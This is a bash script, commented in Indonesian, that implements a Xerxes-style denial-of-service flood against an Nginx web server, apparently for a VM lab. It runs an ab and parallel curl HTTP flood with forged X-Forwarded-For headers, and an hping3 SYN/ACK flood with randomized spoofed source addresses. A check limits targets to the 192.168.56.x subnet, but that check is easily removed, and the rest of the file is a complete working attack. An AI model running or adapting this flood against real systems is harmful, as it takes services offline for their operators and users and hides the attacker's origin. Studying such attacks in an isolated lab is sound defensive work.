#!/usr/bin/env bash
# attacker-xerxes.sh — Xerxes-style high-rate connection + HTTP flood
# VM lab only. Hanya subnet 192.168.56.x diizinkan.
#
# Xerxes membuka banyak koneksi HTTP sekaligus dan mengirim request
# dengan volume tinggi — kombinasi HTTP flood dan TCP connection exhaustion.
# Lebih agresif dari LOIC karena mempertahankan koneksi lebih lama.
set -Eeuo pipefail

TARGET_IP="${TARGET_IP:-192.168.56.103}"
ATTACK_MODE="${ATTACK_MODE:-http_flood}"  # http_flood | tcp_flood
REQUESTS="${REQUESTS:-8000}"
CONCURRENCY="${CONCURRENCY:-80}"
DURATION="${DURATION:-60}"

log() {
  printf '[xerxes] %s\n' "$*"
}

die() {
  printf '[xerxes][ERROR] %s\n' "$*" >&2
  exit 1
}

validate_lab_ip() {
  case "$1" in
    192.168.56.*) ;;
    10.*|172.*|127.*|169.254.*|0.*|255.*) die "IP '$1' bukan subnet lab 192.168.56.x. Script dihentikan." ;;
    *.*.*.*) die "IP '$1' tidak diizinkan. Gunakan subnet VM lokal 192.168.56.x saja." ;;
    *) die "IP '$1' tidak valid." ;;
  esac
}

run_http_flood() {
  command -v ab >/dev/null 2>&1 || die "Install dulu: sudo apt install -y apache2-utils"
  command -v curl >/dev/null 2>&1 || die "Install dulu: sudo apt install -y curl"

  log "Xerxes HTTP flood wave 1: requests=$REQUESTS concurrency=$CONCURRENCY"
  # Gelombang pertama: massive ab flood
  ab -n "$REQUESTS" -c "$CONCURRENCY" -r \
     -H "User-Agent: Xerxes/1.0 (DDoS-Simulator-Lab)" \
     -H "X-Forwarded-For: $(printf '%d.%d.%d.%d' $((RANDOM%254+1)) $((RANDOM%254+1)) $((RANDOM%254+1)) $((RANDOM%254+1)))" \
     "http://$TARGET_IP/" || true

  local end_ts
  end_ts=$(( $(date +%s) + DURATION ))
  local pids=()

  log "Xerxes HTTP flood wave 2: sustained connections=$CONCURRENCY duration=${DURATION}s"
  # Gelombang kedua: banyak worker curl yang pertahankan koneksi
  for i in $(seq 1 "$CONCURRENCY"); do
    (
      while [[ $(date +%s) -lt $end_ts ]]; do
        # Keep-alive connection flood ke berbagai endpoint
        curl -fsS --max-time 2 \
          -H "User-Agent: Xerxes-Worker-$i/1.0" \
          -H "Connection: keep-alive" \
          "http://$TARGET_IP/" >/dev/null 2>&1 || true
      done
    ) &
    pids+=($!)
  done

  for pid in "${pids[@]}"; do
    wait "$pid" 2>/dev/null || true
  done
}

run_tcp_flood() {
  command -v hping3 >/dev/null 2>&1 || die "Install dulu: sudo apt install -y hping3"
  log "Xerxes TCP flood: duration=${DURATION}s target=$TARGET_IP:80"
  # TCP connection flood tanpa SYN-only — full connect attempt rate tinggi
  sudo timeout "${DURATION}s" hping3 \
    --syn \
    --ack \
    --flood \
    --rand-source \
    -p 80 \
    "$TARGET_IP" || true
}

main() {
  validate_lab_ip "$TARGET_IP"

  log "Cek target Nginx"
  curl -fsSI --max-time 5 "http://$TARGET_IP/" || true

  case "$ATTACK_MODE" in
    http_flood) run_http_flood ;;
    tcp_flood)  run_tcp_flood ;;
    *) die "ATTACK_MODE tidak dikenal: $ATTACK_MODE. Pilih: http_flood, tcp_flood" ;;
  esac

  log "Selesai: Xerxes $ATTACK_MODE"
}

main "$@"
